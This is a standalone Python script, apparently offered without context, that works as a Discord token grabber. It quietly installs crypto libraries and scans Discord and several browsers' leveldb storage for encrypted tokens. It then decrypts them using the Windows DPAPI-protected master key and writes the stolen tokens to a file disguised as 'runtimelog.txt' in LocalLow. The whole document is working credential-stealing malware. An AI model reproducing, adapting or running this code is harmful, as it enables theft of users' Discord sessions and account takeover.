def run():
    import os, subprocess, sys, json, urllib.request, re, base64
    user = os.getlogin()

    def install_import(mods):
        for m, p in mods:
            try:
                __import__(m)
            except:
                subprocess.check_call([sys.executable, "-m", "pip", "install", p])
                os.execl(sys.executable, sys.executable, *sys.argv)

    install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])
    import win32crypt
    from Crypto.Cipher import AES

    L = os.getenv("LOCALAPPDATA")
    R = os.getenv("APPDATA")
    P = {
        'Discord': R + '\\discord',
        'Canary': R + '\\discordcanary',
        'PTB': R + '\\discordptb',
        'Opera': R + '\\Opera Software\\Opera Stable',
        'OperaGX': R + '\\Opera Software\\Opera GX Stable',
        'Chrome': L + '\\Google\\Chrome\\User Data\\Default',
        'Edge': L + '\\Microsoft\\Edge\\User Data\\Default',
        'Brave': L + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Vivaldi': L + '\\Vivaldi\\User Data\\Default'
    }

    def gettokens(p):
        p += "\\Local Storage\\leveldb\\"
        t = []
        if not os.path.exists(p): return t
        for f in os.listdir(p):
            if not f.endswith(".ldb") and not f.endswith(".log"): continue
            try:
                with open(p + f, "r", errors="ignore") as r:
                    for line in r:
                        for val in re.findall(r"dQw4w9WgXcQ:[^\"]+", line.strip()):
                            t.append(val)
            except: continue
        return t

    def getkey(p):
        with open(p + "\\Local State", "r") as f:
            return json.loads(f.read())['os_crypt']['encrypted_key']

    def main():
        for _, p in P.items():
            if not os.path.exists(p): continue
            for tok in gettokens(p):
                try:
                    tok = tok.replace("\\", "") if tok.endswith("\\") else tok
                    k = win32crypt.CryptUnprotectData(base64.b64decode(getkey(p))[5:], None, None, None, 0)[1]
                    et = base64.b64decode(tok.split('dQw4w9WgXcQ:')[1])
                    iv = et[3:15]
                    payload = et[15:]
                    cipher = AES.new(k, AES.MODE_GCM, iv)
                    d = cipher.decrypt(payload)[:-16].decode()
                    with open(f'C:\\Users\\{user}\\AppData\\LocalLow\\runtimelog.txt', 'a') as out:
                        out.write(d + '\n')
                except: continue

    main()

if __name__ == "__main__":
    run()